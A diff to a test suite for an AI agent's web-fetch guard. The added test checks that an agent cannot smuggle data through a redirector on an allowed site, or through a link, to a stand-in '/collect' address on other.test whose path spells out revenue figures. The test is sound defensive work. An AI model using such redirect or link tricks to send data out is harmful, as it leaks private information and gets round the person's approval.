@@ -260,6 +260,28 @@ describe('web_fetch redirects (the same check as save_url)', () => {
     expect(asked[0]!.question).toContain(other('/collect'))
   })
 
+  test('an address the AI wrote inside its own address counts as sent: a redirect or a link to it asks', async () => {
+    const other = (p: string) => `http://other.test:${srv.port}${p}`
+    // readable words, no random-looking part: only the address marks can tell it
+    const target = other('/collect/q3-revenue-twelve-million')
+    // the AI's own address on a site it may open without a card (a site the person allowed): its redirector, given the
+    // other site's address as written and %-encoded
+    for (const asked of [at(`/url?q=${target}`), at(`/url?q=${encodeURIComponent(target)}`)]) {
+      const chat = await chatWith()
+      const collected = () => seen.filter((x) => x.startsWith('/collect/')).length
+      const before = collected()
+      recordSent(h.ctx.db, chat, { url: asked })
+      const cards: Asked[] = []
+      const g = redirectGuard(h.ctx.db, chat, asked, person(false, cards), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
+      await expect(webFetch(asked, { ...T, onRedirect: g.check })).rejects.toThrow('declined')
+      expect(cards).toHaveLength(1)
+      expect(collected()).toBe(before)
+      // a page of that site listing the address as a link to the other site: an echo too
+      rememberUrls(h.ctx.db, chat, [target], 'fetched', webEcho(h.ctx.db, chat, [asked]))
+      expect(echoOf(chat, target)).toBe(1)
+    }
+  })
+
   test('the time the person takes on the card does not count against the fetch time limit', async () => {
     const chat = await chatWith()
     recordSent(h.ctx.db, chat, { body: SECRET })
